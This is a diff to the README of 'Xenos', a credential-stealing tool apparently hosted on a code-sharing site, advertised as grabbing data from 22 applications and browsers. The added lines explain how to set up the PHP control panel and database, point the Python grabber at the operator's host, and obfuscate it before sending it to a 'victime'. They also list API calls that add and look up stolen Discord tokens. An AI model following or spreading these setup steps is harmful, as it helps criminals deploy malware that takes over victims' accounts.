@@ -17,6 +17,30 @@
 > - Grabber on 22 Applications/browsers
 > - Very Simple Usage
 
+<br><br>
+
+> ## Usage
+> For use Xenos, you need a Server accept PHP and contain a database,
+> 1. Put the files in your host
+> 2. Make your database ip,databse name,username,password in the file `Inc/database.php`
+> 3. Setup your password in `Async/login.php` (its the password for access to the panel)
+> 4. Setup your password and your webhook in `api.php` at line 8 and 9.
+> 5. Make your host adress in `Grabber/python/Xenos.py` at line 5
+> 6. Compte and Obfusque your Grabber and send it to your victime :)
+
+> 7. Put a stars and follow me for more :)
+
+<br><br>
+
+> ## API Working
+> - Add Discord Token To Database
+> - - `https://yourhost.com/api?type=addtoken&token=THE_VICTIME_TOKEN`
+> - Remove Discord Token From Database
+> - - `https://yourhost.com/api?type=removetoken&password=YOUR_SECRET_PASSWORD&token=THE_VICTIME_TOKEN`
+> - Fetch Discord Token Info From Database
+> - - `https://yourhost.com/api?type=fetchtoken&password=YOUR_SECRET_PASSWORD&token=THE_VICTIME_TOKEN`
+
+<br><br>
 
 ## Demos
 > - ### Login Page
